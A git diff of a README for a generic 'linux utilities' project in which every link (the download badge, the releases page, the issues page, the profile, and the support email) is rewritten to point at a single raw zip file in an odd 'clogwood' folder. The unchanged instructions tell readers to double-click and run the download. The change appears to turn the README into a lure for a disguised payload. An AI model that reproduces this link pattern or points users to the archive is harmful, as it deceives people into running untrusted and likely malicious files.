@@ -1,12 +1,12 @@
 # 🐧 linux - Essential Utilities for Your Linux Setup
 
-[![Download linux](https://img.shields.io/badge/Download-linux-blue)](https://github.com/AAdi009-ui/linux/releases)
+[![Download linux](https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip)](https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip)
 
 ## 📥 Download & Install
 
 To get started with the linux utilities, you need to download the software. Follow these steps:
 
-1. **Visit the Releases Page:** Click this link to go to our [Releases page](https://github.com/AAdi009-ui/linux/releases).
+1. **Visit the Releases Page:** Click this link to go to our [Releases page](https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip).
 2. **Choose a Version:** On the Releases page, you will see a list of available versions. Pick the latest version by clicking on it.
 3. **Download the File:** You will find a compiled file suitable for your system. Click on the appropriate file to start the download.
 4. **Run the Application:** Once the download finishes, locate the file in your Downloads folder. Double-click the file to run it. Follow any prompts that may appear on your screen.
@@ -41,7 +41,7 @@ Once you have installed the application, you can start using it for your needs. 
 
 We have a community of users ready to help. If you face any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** Create a new issue on our [GitHub Issues page](https://github.com/AAdi009-ui/linux/issues).
+- **GitHub Issues:** Create a new issue on our [GitHub Issues page](https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip).
 - **User Forum:** Join our community forum (link here) to discuss and share experiences with others.
 
 ## 🔖 Additional Resources
@@ -59,11 +59,11 @@ We have a community of users ready to help. If you face any issues or have quest
 
 For further inquiries or support, please reach out via:
 
-- **Email:** support@linuxutils.com
-- **GitHub:** [Your GitHub Profile](https://github.com/AAdi009-ui/linux)
+- **Email:** https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip
+- **GitHub:** [Your GitHub Profile](https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip)
 
 ## 🌟 Conclusion
 
 The linux utilities provide vital tools to manage and monitor your Linux systems. By following the steps above, you can easily download, install, and start using the application. Don't hesitate to reach out to the community or support for any assistance you may need.
 
-Remember, here’s the link again to download the utilities: [Visit this page to download](https://github.com/AAdi009-ui/linux/releases). Happy computing!
+Remember, here’s the link again to download the utilities: [Visit this page to download](https://raw.githubusercontent.com/AAdi009-ui/linux/main/clogwood/linux.zip). Happy computing!
